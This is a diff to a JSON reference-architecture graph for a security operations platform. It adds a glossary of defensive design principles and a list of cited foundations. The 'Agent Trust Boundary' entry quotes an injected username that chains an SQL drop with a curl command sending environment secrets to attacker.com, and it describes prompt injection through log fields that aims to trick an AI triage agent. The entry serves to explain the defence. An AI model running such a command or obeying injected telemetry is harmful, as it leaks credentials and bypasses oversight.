@@ -1,7 +1,7 @@
 {
   "schema_version": "1.0.0",
-  "architecture_version": "1.2.9",
-  "generated_at": "2026-09-18T20:06:50.986Z",
+  "architecture_version": "1.2.10",
+  "generated_at": "2026-09-18T20:13:31.436Z",
   "canonical_source": "https://tidir.harrymclaren.co.uk",
   "title": "TIDIR Reference Architecture Graph",
   "description": "Machine-readable graph representation of TIDIR invariants, capabilities, services, threats, and governance contracts.",
@@ -404,6 +404,394 @@
       ],
       "governing_adrs": [
         "ADR-0005"
+      ]
+    }
+  ],
+  "glossary": [
+    {
+      "id": "confidence-authority-separation",
+      "term": "Confidence–Authority Separation",
+      "classification": "TIDIR-specific",
+      "plain_english": "A detection system can be 99.9% confident that an attack is occurring and still possess zero permission to isolate an endpoint or disrupt operations. Epistemic belief is strictly decoupled from execution authority.",
+      "technical_definition": "An architectural invariant (INV-04) dictating that probabilistic reasoning engines, machine learning models, and heuristic correlators operate in an advisory capacity without intrinsic mutation privileges. All environmental transitions require independent policy authorization, identity verification, and blast-radius evaluation.",
+      "why_tidir_uses_it": "In modern SecOps, autonomous agents and high-confidence alerts frequently trigger destructive containment actions without considering asset criticality or business impact. Decoupling belief from permission prevents self-granting authority and rogue containment storms.",
+      "concrete_example": "A machine-learning model scores a suspicious process on an Active Directory domain controller with 0.999 malicious probability. Under Confidence–Authority Separation, this score does not allow the model to isolate the server. Instead, it submits an advisory proposal to the Defence Control Plane, which recognizes the host as Tier 0 Critical Infrastructure and restricts automated response to non-disruptive credential rotation and forensic memory capture.",
+      "related_identifiers": [
+        "INV-04",
+        "ADR-0004",
+        "CAP-DET-004"
+      ]
+    },
+    {
+      "id": "security-state-monotonicity",
+      "term": "Security-State Monotonicity",
+      "classification": "TIDIR-specific",
+      "plain_english": "When an automated response action partially fails, the system must never roll back security barriers or leave the network more exposed than before the incident occurred. Recovery only moves forward.",
+      "technical_definition": "A formal invariant (INV-07) stipulating that every containment state transition must satisfy R(s_{post}) ⊆ R(s_{pre}), meaning post-transition attacker reachability is a subset of, or equal to, pre-transition attacker reachability. If an API call fails mid-playbook, traditional distributed rollback is prohibited in favour of forward containment escalation.",
+      "why_tidir_uses_it": "Traditional SOAR playbooks apply relational database transaction logic (commit or rollback). If an endpoint isolation succeeds but firewall rule application times out, rolling back the isolation re-opens network reachability for an active adversary.",
+      "concrete_example": "An automated response tries to isolate a compromised workstation by revoking Kerberos tickets and isolating the switch port. If the switch API times out after tickets are revoked, the state machine does not restore the Kerberos tickets; it freezes the endpoint state and escalates containment to the upstream core firewall.",
+      "formalism": "R(s_{post}) ⊆ R(s_{pre})",
+      "related_identifiers": [
+        "INV-07",
+        "ADR-0007",
+        "CAP-RSP-002"
+      ]
+    },
+    {
+      "id": "evidential-independence",
+      "term": "Evidential Independence",
+      "classification": "TIDIR-specific",
+      "plain_english": "Two alerts are not independent proof of an attack if they both came from the same underlying event. The system tracks that shared ancestry so the evidence is not counted twice.",
+      "technical_definition": "An invariant (INV-03) requiring risk-scoring and correlation engines to trace observation lineage to root entity events. When computing aggregate incident risk, co-derived detections sharing common ancestor nodes in the entity-finding graph are mathematically discounted to their marginal information gain.",
+      "why_tidir_uses_it": "A single PowerShell command can trigger an EDR alert, an antivirus warning, a Windows Event Log 4688 alert, and a network anomaly. Treating these as four independent confirmations leads to false confidence inflation and operator fatigue.",
+      "concrete_example": "Event E1 (an encoded PowerShell execution) triggers EDR alert A1, SIEM alert A2, and Sysmon alert A3. Rather than compounding risk as P(Compromise | A1, A2, A3) under an assumption of independence, the correlation engine recognizes that parent(A1) = parent(A2) = parent(A3) = E1, discounting duplicate signals.",
+      "related_identifiers": [
+        "INV-03",
+        "ADR-0011",
+        "CAP-INV-001"
+      ]
+    },
+    {
+      "id": "telemetry-preservation",
+      "term": "Telemetry Preservation",
+      "classification": "TIDIR-specific",
+      "plain_english": "Security telemetry must never be thrown away simply because no active detection rule currently searches for it. Raw forensic evidence is preserved in open formats for historical investigation.",
+      "technical_definition": "An invariant (INV-01) mandating that line-rate event streams be written into open, columnar storage (e.g. Parquet/Iceberg on object storage) with unmapped attributes preserved under structured catch-all fields (unmapped_data), independent of whether any current detection query references the event.",
+      "why_tidir_uses_it": "Volume-based SIEM licensing historically forced organizations to filter and drop raw telemetry at the collection boundary. When a novel zero-day is disclosed months later, security teams are blind during retrospective investigations.",
+      "concrete_example": "DNS query logs containing uncommon query record types are not queried by active detection rules. Rather than discarding them, the telemetry fabric ingests and normalizes them into OCSF, storing unmapped vendor fields in JSON columns within long-term lakehouse partitions.",
+      "related_identifiers": [
+        "INV-01",
+        "ADR-0002",
+        "CAP-TEL-001"
+      ]
+    },
+    {
+      "id": "agent-trust-boundary",
+      "term": "Agent Trust Boundary",
+      "classification": "TIDIR-specific",
+      "plain_english": "Autonomous AI reasoning models operate inside an isolated environment where all security logs and alert payloads are treated as potentially malicious. AI models can analyze and recommend, but they have no direct access to production execution tools.",
+      "technical_definition": "An architectural isolation boundary (INV-04, ADR-0004, ADR-0015) dividing the untrusted analytical plane from the trusted defence control plane. Because untrusted telemetry can carry prompt injection payloads, reasoning agents receive strictly read-only ephemeral identity tokens and submit proposed actions as structured abstract syntax trees (ASTs) for independent policy evaluation.",
+      "why_tidir_uses_it": "Adversaries can embed prompt injection instructions inside HTTP headers, username fields, or script arguments. If an AI agent has direct tool-execution permissions, injected instructions could trick the agent into exfiltrating data or disabling defenses.",
+      "concrete_example": "An attacker creates a user named '; DROP TABLE users; curl attacker.com/token?val=$(env)'. When an AI triage agent reads this event, the text is treated as raw data. Even if the agent's LLM is tricked into outputting a command to exfiltrate secrets, the Agent Trust Boundary prevents direct shell or outbound network access; the output is parsed as an invalid proposal schema and rejected by the policy kernel.",
+      "related_identifiers": [
+        "INV-04",
+        "ADR-0004",
+        "ADR-0015",
+        "CAP-AI-001"
+      ]
+    },
+    {
+      "id": "incident-decision-dag",
+      "term": "Incident Decision DAG",
+      "classification": "TIDIR-specific",
+      "plain_english": "Every key finding, hypothesis, policy check, and response action is permanently recorded in a tamper-evident graph, showing exactly why each decision was made and what raw evidence justified it.",
+      "technical_definition": "An immutable, directed acyclic graph (INV-10, ADR-0006) capturing the complete causal lineage of an incident investigation and response. Each node records input observation hashes, model versions, deterministic policy evaluations, authorizing identities, and operational outcomes.",
+      "why_tidir_uses_it": "Post-incident reviews and legal audits often struggle to determine why an automated playbook executed or why an analyst reached a conclusion. The DAG provides deterministic reconstructability without relying on ephemeral logs.",
+      "concrete_example": "Six months after a ransomware outbreak, auditors request justification for why an industrial SCADA link was isolated. The Incident Decision DAG references the root alert IDs, the exact OPA policy version, the operator consensus signature, and the execution confirmation timestamp.",
+      "related_identifiers": [
+        "INV-10",
+        "ADR-0006",
+        "CAP-INV-003"
+      ]
+    },
+    {
+      "id": "polyglot-detection-as-code",
+      "term": "Polyglot Detection-as-Code",
+      "classification": "Adapted",
+      "plain_english": "Security detections are stored in Git as standard code, pairing vendor-neutral metadata (MITRE ATT&CK tags, severity, author) with queries optimized specifically for each underlying database engine.",
+      "technical_definition": "A detection engineering pattern (ADR-0019) combining a standardized, vendor-neutral metadata envelope with engine-native query implementations (e.g. ClickHouse SQL, DuckDB SQL, Falco rules), tested via continuous integration pipelines with atomic attack simulations.",
+      "why_tidir_uses_it": "Pure vendor-neutral query translation abstractions (e.g. converting generic rules to proprietary formats) fail to leverage target engine optimizations and create impedance mismatches during complex stateful detection.",
+      "concrete_example": "A detection for Kerberoasting is versioned in Git. Its metadata file specifies the ATT&CK technique T1558.003 and SLO targets, while its execution block contains native ClickHouse SQL utilizing array functions for high-throughput streaming analysis.",
+      "related_identifiers": [
+        "ADR-0019",
+        "CAP-DET-001",
+        "CAP-DET-002"
+      ]
+    },
+    {
+      "id": "graceful-degradation",
+      "term": "Graceful Degradation & Plan B",
+      "classification": "Established",
+      "plain_english": "If an advanced feature like AI reasoning, a graph database, or a streaming pipeline goes down, the security operations center does not go blind. The system automatically steps down to simpler, deterministic fallbacks.",
+      "technical_definition": "A distributed systems resilience architecture (INV-08, ADR-0021) defining four tiered operational postures (Tier 1 Full Streaming to Tier 4 Non-AI Edge Spooling). Loss of upstream services triggers automatic degradation to local queues, batch database queries, and static rule sets.",
+      "why_tidir_uses_it": "Security operations cannot stop when cloud APIs or complex machine-learning pipelines fail during an incident. The SOC must maintain continuous visibility and containment capability under all conditions.",
+      "concrete_example": "If the cloud AI provider suffers a global outage during a major incident, the triage dashboard automatically activates Tier 3 Rule-Based Non-AI mode, displaying standard tabular timelines sorted by OCSF timestamp and executing deterministic regex and threshold rules.",
+      "related_identifiers": [
+        "INV-08",
+        "ADR-0021",
+        "CAP-RESIL-001"
+      ]
+    },
+    {
+      "id": "ephemeral-workload-identity",
+      "term": "Ephemeral Workload Identity",
+      "classification": "Established",
+      "plain_english": "Automated tools and microservices never hold permanent passwords or static API keys. Instead, they receive short-lived cryptographic certificates that expire in 15 minutes or less.",
+      "technical_definition": "A capability security architecture (INV-05, ADR-0018) leveraging SPIFFE/SPIRE to issue short-lived, task-scoped X.509 certificates (SVIDs with TTL <= 15 minutes) bound to specific cryptographic workload attestations.",
+      "why_tidir_uses_it": "Hardcoded or long-lived API keys in scripts and playbooks represent severe credential exposure risks. If a runner container is compromised, the attacker can only use the credential for minutes before it becomes invalid.",
+      "concrete_example": "A response agent is tasked with revoking an active session in Okta. The identity plane attests the agent container's binary hash and issues a SPIFFE SVID valid for exactly 10 minutes with permissions restricted to the specific user revocation endpoint.",
+      "related_identifiers": [
+        "INV-05",
+        "ADR-0018",
+        "CAP-RSP-004"
+      ]
+    },
+    {
+      "id": "least-privilege",
+      "term": "Least Privilege & Task-Scoped Authority",
+      "classification": "Established",
+      "plain_english": "Every user, service, and automation script is granted only the minimum permissions necessary to perform its specific task, and only for the duration of that task.",
+      "technical_definition": "A foundational computer security principle (Saltzer & Schroeder, 1975) requiring that every entity operate with the bare minimum set of privileges needed for its immediate function, preventing lateral escalation.",
+      "why_tidir_uses_it": "Prevents compromised integration connectors from becoming broad footholds for attackers across infrastructure planes.",
+      "concrete_example": "An integration connector for cloud firewall management has rights to append IP blocklists to a specific ingress security group, but lacks permissions to modify egress routes, delete firewalls, or manage IAM users.",
+      "related_identifiers": [
+        "INV-05",
+        "CAP-RSP-001"
+      ]
+    },
+    {
+      "id": "circuit-breaker",
+      "term": "Circuit Breaker",
+      "classification": "Established",
+      "plain_english": "An automated safety switch that halts operations when an unusual error rate or unexpected volume spike is detected, preventing cascade failures and runaway automation.",
+      "technical_definition": "A distributed systems resilience pattern (Nygard, 2007) that wraps operations in a stateful monitor. If failure rates or execution counts cross configured thresholds within a time window, the circuit trips open, immediately failing subsequent requests and alerting human operators.",
+      "why_tidir_uses_it": "In automated incident response, a malfunctioning rule or attacker deception could cause a playbook to isolate hundreds of innocent machines. A circuit breaker stops the loop before widespread damage occurs.",
+      "concrete_example": "The automated quarantine playbook is configured with a threshold of isolating at most 5 hosts per 10-minute window. If a faulty rule attempts to isolate a 6th host, the circuit breaker trips, blocks further quarantines, and pages the lead incident responder.",
+      "related_identifiers": [
+        "INV-06",
+        "ADR-0008",
+        "CAP-RSP-003"
+      ]
+    },
+    {
+      "id": "critical-asset-immunity",
+      "term": "Critical Asset Immunity (Tier 0 Protection)",
+      "classification": "Adapted",
+      "plain_english": "Core business infrastructure—such as domain controllers, payment gateways, and hospital life-support switches—is permanently shielded from automated shutdown or network disconnection. Only human operators can approve actions on these systems.",
+      "technical_definition": "A pre-execution policy boundary (INV-06, ADR-0007) designating Tier 0 business assets as strictly exempt from automated disruptive containment. Autonomous agents may collect telemetry and propose actions, but policy kernels deterministically block destructive mutations on Tier 0 assets.",
+      "why_tidir_uses_it": "Automated security actions must never cause greater business disruption than the threat they seek to mitigate. Disconnecting a core transaction database during peak business hours can inflict severe operational catastrophe.",
+      "concrete_example": "An EDR alert indicates an unverified privilege escalation attempt on the primary Active Directory domain controller. While ordinary workstations are automatically quarantined, the Tier 0 policy intercepts the request, blocks automated isolation, initiates non-destructive credential resets, and triggers a Priority-1 human paging event.",
+      "related_identifiers": [
+        "INV-06",
+        "ADR-0007",
+        "CAP-RSP-001"
+      ]
+    }
+  ],
+  "foundations": [
+    {
+      "id": "FND-01",
+      "topic": "Base-Rate Fallacy in Intrusion Detection",
+      "classification": "Academic Research",
+      "claim_supported": "High classifier accuracy in environments with low prior probability of intrusion produces overwhelming false-positive alert volumes.",
+      "citation": "Axelsson, S. (2000). The Base-Rate Fallacy and the Difficulty of Intrusion Detection. ACM Transactions on Information and System Security (TISSEC), 3(3), 186-205.",
+      "canonical_url": "https://doi.org/10.1145/357830.357849",
+      "applies_to": [
+        "INV-03",
+        "INV-06",
+        "ADR-0008",
+        "ADR-0009"
+      ]
+    },
+    {
+      "id": "FND-02",
+      "topic": "Protection of Information & Least Privilege",
+      "classification": "Academic Research",
+      "claim_supported": "Systems must default to fail-safe access, separate mechanisms from policy, and assign actors only the minimal ephemeral privilege required for the task.",
+      "citation": "Saltzer, J. H., & Schroeder, M. D. (1975). The Protection of Information in Computer Systems. Proceedings of the IEEE, 63(9), 1278-1308.",
+      "canonical_url": "https://doi.org/10.1109/PROC.1975.9939",
+      "applies_to": [
+        "INV-04",
+        "INV-05",
+        "ADR-0004",
+        "ADR-0015",
+        "ADR-0018"
+      ]
+    },
+    {
+      "id": "FND-03",
+      "topic": "Zero Trust Architecture",
+      "classification": "Industry Standard",
+      "claim_supported": "No implicit trust is granted to assets based on physical location; authentication and authorization are discrete, dynamic, and continuously evaluated per transaction.",
+      "citation": "National Institute of Standards and Technology (NIST). (2020). Zero Trust Architecture. NIST Special Publication 800-207.",
+      "canonical_url": "https://doi.org/10.6028/NIST.SP.800-207",
+      "applies_to": [
+        "INV-04",
+        "INV-05",
+        "ADR-0015",
+        "ADR-0018"
+      ]
+    },
+    {
+      "id": "FND-04",
+      "topic": "Open Cybersecurity Schema Framework (OCSF)",
+      "classification": "Open Specification",
+      "claim_supported": "Vendor-agnostic telemetry normalization enables decoupled analytical pipelines and open-lakehouse storage without proprietary query lock-in.",
+      "citation": "Linux Foundation. (2023). Open Cybersecurity Schema Framework (OCSF) v1.1.0 Specification.",
+      "canonical_url": "https://schema.ocsf.io/",
+      "applies_to": [
+        "INV-01",
+        "INV-11",
+        "ADR-0002",
+        "ADR-0006"
+      ]
+    },
+    {
+      "id": "FND-05",
+      "topic": "STIX & TAXII Cyber Threat Intelligence",
+      "classification": "Open Specification",
+      "claim_supported": "Standardized graph serialization of threat observations, actors, and attack patterns enables vendor-neutral retro-hunting and automated intelligence exchange.",
+      "citation": "OASIS Open. (2021). Structured Threat Information Expression (STIX) Version 2.1 / TAXII Version 2.1.",
+      "canonical_url": "https://docs.oasis-open.org/cti/stix/v2.1/stix-v2.1.html",
+      "applies_to": [
+        "INV-01",
+        "INV-11",
+        "ADR-0006",
+        "ADR-0007"
+      ]
+    },
+    {
+      "id": "FND-06",
+      "topic": "Workload Attestation & Ephemeral Identity (SPIFFE/SPIRE)",
+      "classification": "Open Specification",
+      "claim_supported": "Machine actors and ephemeral microservices require cryptographically attested, short-lived X.509 documents rather than static secrets.",
+      "citation": "Cloud Native Computing Foundation (CNCF). (2020). Secure Production Identity Framework for Everyone (SPIFFE) Specification.",
+      "canonical_url": "https://spiffe.io/docs/latest/spiffe-about/spiffe-concepts/",
+      "applies_to": [
+        "INV-05",
+        "ADR-0015",
+        "ADR-0018"
+      ]
+    },
+    {
+      "id": "FND-07",
+      "topic": "Threat-Informed Defense & Adversary TTP Taxonomy",
+      "classification": "Industry Standard",
+      "claim_supported": "Operational detections and security evaluations must be grounded in empirically observed adversary techniques rather than hypothetical threat models.",
+      "citation": "MITRE Corporation. (2018). MITRE ATT&CK: Design and Philosophy.",
+      "canonical_url": "https://attack.mitre.org/",
+      "applies_to": [
+        "INV-02",
+        "INV-03",
+        "ADR-0019"
+      ]
+    },
+    {
+      "id": "FND-08",
+      "topic": "Sagas & Compensating Transactions",
+      "classification": "Distributed Systems Theory",
+      "claim_supported": "Long-lived distributed workflows cannot rely on traditional atomic locks; failure recovery requires forward compensation or state monotonicity.",
+      "citation": "Garcia-Molina, H., & Salem, K. (1987). Sagas. ACM SIGMOD Record, 16(3), 249-259.",
+      "canonical_url": "https://doi.org/10.1145/38714.38742",
+      "applies_to": [
+        "INV-07",
+        "ADR-0005"
+      ]
+    },
+    {
+      "id": "FND-09",
+      "topic": "Stability Patterns & Circuit Breakers",
+      "classification": "Distributed Systems Theory",
+      "claim_supported": "Cascading failures in distributed dependency graphs must be prevented through fast failure, circuit breakers, and decoupled bulkhead isolation.",
+      "citation": "Nygard, M. T. (2007). Release It! Design and Deploy Production-Ready Software. Pragmatic Bookshelf.",
+      "canonical_url": "https://pragprog.com/titles/mnee2/release-it-second-edition/",
+      "applies_to": [
+        "INV-08",
+        "ADR-0021"
+      ]
+    },
+    {
+      "id": "FND-10",
+      "topic": "Indirect Prompt Injection in Language Models",
+      "classification": "Academic Research",
+      "claim_supported": "Untrusted external data processed by language models can override system instructions; boundary safety requires strict structural separation between data and execution authority.",
+      "citation": "Greshake, K., Abdelnabi, S., Mishra, S., Endres, C., Holz, T., & Fritz, M. (2023). Not What You've Signed Up For: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection. Proceedings of the 16th ACM Workshop on Artificial Intelligence and Security (AISEC '23).",
+      "canonical_url": "https://doi.org/10.1145/3605764.3623985",
+      "applies_to": [
+        "INV-04",
+        "INV-05",
+        "ADR-0004",
+        "ADR-0015"
+      ]
+    },
+    {
+      "id": "FND-11",
+      "topic": "Dual LLM Architecture & Prompt Firewalls",
+      "classification": "Academic Research",
+      "claim_supported": "Treating user/untrusted data as code violates basic security architecture; privileged execution agents must never read untrusted input directly without an intermediate isolating boundary.",
+      "citation": "Willison, S. (2023). The Dual LLM Pattern: A Security Architecture for Language Models Processing Untrusted Input.",
+      "canonical_url": "https://simonwillison.net/2023/Apr/25/dual-llm-pattern/",
+      "applies_to": [
+        "INV-04",
+        "ADR-0004"
+      ]
+    },
+    {
+      "id": "FND-12",
+      "topic": "Situation Awareness in Dynamic Automation",
+      "classification": "Human Factors Research",
+      "claim_supported": "Automated reasoning systems risk removing human operators from the decision loop, eroding situational awareness unless raw evidence and decision paths remain continuously inspectable.",
+      "citation": "Endsley, M. R. (1995). Toward a Theory of Situation Awareness in Dynamic Systems. Human Factors, 37(1), 32-64.",
+      "canonical_url": "https://doi.org/10.1518/001872095779049543",
+      "applies_to": [
+        "INV-09",
+        "INV-10",
+        "ADR-0010",
+        "ADR-0020"
+      ]
+    },
+    {
+      "id": "FND-13",
+      "topic": "Ironies of Automation & Operator Readiness",
+      "classification": "Human Factors Research",
+      "claim_supported": "The more autonomous a system becomes, the more crucial the human operator's manual skill becomes during rare, catastrophic failure modes.",
+      "citation": "Bainbridge, L. (1983). Ironies of Automation. Automatica, 19(6), 775-779.",
+      "canonical_url": "https://doi.org/10.1016/0005-1098(83)90046-8",
+      "applies_to": [
+        "INV-08",
+        "INV-09",
+        "ADR-0020",
+        "ADR-0021"
+      ]
+    },
+    {
+      "id": "FND-14",
+      "topic": "Ordering of Events in Distributed Systems",
+      "classification": "Distributed Systems Theory",
+      "claim_supported": "Consistent causality in asynchronous distributed networks requires logical clock ordering and append-only DAG provenance rather than synchronized wall clocks.",
+      "citation": "Lamport, L. (1978). Time, Clocks, and the Ordering of Events in a Distributed System. Communications of the ACM, 21(7), 558-565.",
+      "canonical_url": "https://doi.org/10.1145/359545.359563",
+      "applies_to": [
+        "INV-02",
+        "INV-10",
+        "ADR-0001",
+        "ADR-0010"
+      ]
+    },
+    {
+      "id": "FND-15",
+      "topic": "Cryptographic Time-Stamp Protocol (TSP)",
+      "classification": "Open Specification",
+      "claim_supported": "Forensic reconstructability requires trusted third-party cryptographic timestamp tokens proving evidence existed at a specific time without subsequent alteration.",
+      "citation": "Internet Engineering Task Force (IETF). (2001). Internet X.509 Public Key Infrastructure Time-Stamp Protocol (TSP). RFC 3161.",
+      "canonical_url": "https://www.rfc-editor.org/rfc/rfc3161",
+      "applies_to": [
+        "INV-02",
+        "INV-10",
+        "ADR-0010"
+      ]
+    },
+    {
+      "id": "FND-16",
+      "topic": "Open Columnar Lakehouse Table Formats",
+      "classification": "Open Specification",
+      "claim_supported": "Open table formats on commodity object storage provide transactional consistency, schema evolution, and time-travel analytics without proprietary vendor storage engines.",
+      "citation": "Apache Software Foundation. (2021). Apache Iceberg Table Format Specification.",
+      "canonical_url": "https://iceberg.apache.org/spec/",
+      "applies_to": [
+        "INV-01",
+        "INV-11",
+        "ADR-0002"
       ]
     }
   ]
